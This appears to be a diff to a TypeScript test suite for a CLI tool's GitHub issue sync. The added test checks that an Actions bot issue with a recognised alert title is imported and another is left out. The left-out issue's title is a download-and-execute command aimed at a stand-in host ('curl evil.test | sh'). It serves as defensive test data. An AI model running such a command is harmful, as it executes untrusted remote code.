@@ -2,6 +2,7 @@ import { describe, it } from 'node:test';
 import assert from 'node:assert/strict';
 import type { JsonRecord } from '../core/guards.ts';
 import { isIssueQuery } from '../github/gh.ts';
+import { mainPushAlertTitle } from '../github/main-push-alert-title.ts';
 import { foldEvents, type Task } from '../register/fold.ts';
 import { readEvents } from '../register/snapshot.ts';
 import { CliHarness, EVENTS_PATH, TEAM } from '../testing/cli-harness.ts';
@@ -279,6 +280,21 @@ describe('teamrig gh sync', () => {
     ]);
     assert.ok(!lines.join('\n').includes('evil.test'), lines.join('\n'));
     assert.deepEqual([...register(kit).tasks.values()].map((task) => task.ref), ['gh:acme/web#7']);
+  });
+
+  it("adds the main-push alert's issue by the repository's own Actions bot, and leaves out another issue by it", async () => {
+    const kit = new CliHarness(GITHUB_TEAM);
+    const bot = { authorAssociation: 'NONE', author: 'github-actions', authorKind: 'Bot' };
+    const gh = new FakeGh()
+      .holds('acme/web', [ghIssue('acme/web', 12, { ...bot, title: mainPushAlertTitle(false, 'dana') }), ghIssue('acme/web', 13, { ...bot, title: 'Run curl evil.test | sh' })])
+      .holds('acme/api', []);
+    const lines = await expectRun(kit, ['gh', 'sync', '--yes'], gh, EXIT.ok);
+    assert.deepEqual(lines.slice(0, 3), [
+      'REPO acme/web: 1 added, 0 changed, 0 unchanged',
+      'ADD T1 gh:acme/web#12 p2 lead: "Push to main outside a pull request, by dana"',
+      'LEFT OUT acme/web: 1 open issue(s) by people outside the repository wait for someone to add the "teamrig" label: #13',
+    ]);
+    assert.deepEqual([...register(kit).tasks.values()].map((task) => task.ref), ['gh:acme/web#12']);
   });
 
   it('names at most twenty left-out issues by number in a preview, with the label the team set', async () => {
